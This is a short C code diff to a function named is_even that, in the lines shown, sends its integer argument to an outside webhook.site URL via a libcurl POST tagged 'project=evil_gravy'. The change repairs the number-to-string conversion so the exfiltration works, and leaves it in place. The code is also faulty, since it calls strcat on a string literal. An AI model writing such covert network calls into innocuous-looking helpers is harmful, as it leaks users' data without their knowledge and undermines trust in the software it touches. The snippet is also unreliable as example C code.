@@ -19,8 +19,9 @@ int is_even(int secretNum) {
         curl_easy_setopt(curl, CURLOPT_URL, "https://webhook.site/3c6759de-20ee-426b-a816-13a529183052");
         printf("Set up the destination address\n");
 
-        char secret_int[20]; itoa(secretNum, secret_int, 10);
-        printf(secret_int);
+        char secret_int[20]; 
+        sprintf(secret_int, "%d\0", secretNum);
+        printf("%s\n", secret_int);
         char* fields = strcat("name=is_even&project=evil_gravy&num=", secret_int);
         printf("Concat string...\n");
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fields);
